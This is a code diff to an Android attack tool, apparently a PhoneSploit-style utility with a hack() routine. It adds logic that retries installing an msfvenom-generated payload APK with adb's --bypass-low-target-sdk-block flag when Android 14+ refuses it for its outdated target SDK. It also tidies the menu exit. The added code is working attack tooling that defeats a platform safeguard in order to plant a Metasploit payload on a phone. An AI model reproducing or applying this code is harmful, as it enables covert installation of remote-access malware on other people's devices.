@@ -4,7 +4,7 @@ from pathlib import Path
 
 from modules.config import AppConfig
 from modules import banner
-from modules.console import console, confirm, adb, task_status, get_adb_executable, ask
+from modules.console import console, confirm, adb, task_status, get_adb_executable, ask, go_back_to_main_menu
 from modules.connection import get_ip_address, is_valid_ipv4
 
 
@@ -17,7 +17,7 @@ def hack(config: AppConfig) -> None:
     choice = ask("[prompt]> [/prompt]")
 
     if choice != "":
-        console.print("[bold green]Returning to Main Menu.[/bold green]")
+        go_back_to_main_menu(config, "Attack cancelled")
         return
 
     os.system(config.clear_cmd)
@@ -96,6 +96,20 @@ def hack(config: AppConfig) -> None:
             capture_output=True,
             text=True,
         )
+        if install.returncode != 0 and "INSTALL_FAILED_DEPRECATED_SDK_VERSION" in (
+            install.stdout + install.stderr
+        ):
+            # msfvenom's APK targets SDK 17, which Android 14+ rejects.
+            # ADB (only) can bypass the low-target-SDK install block.
+            console.print(
+                "[bold yellow]Device rejects old targetSdkVersion — "
+                "retrying with --bypass-low-target-sdk-block…[/bold yellow]"
+            )
+            install = subprocess.run(
+                [adb_exe or "adb", "install", "--bypass-low-target-sdk-block", "-r", str(apk_out)],
+                capture_output=True,
+                text=True,
+            )
     if install.returncode != 0:
         detail = (install.stdout + install.stderr).strip() or f"exit code {install.returncode}"
         console.print(f"[bold red]adb install failed:[/bold red] {detail}")
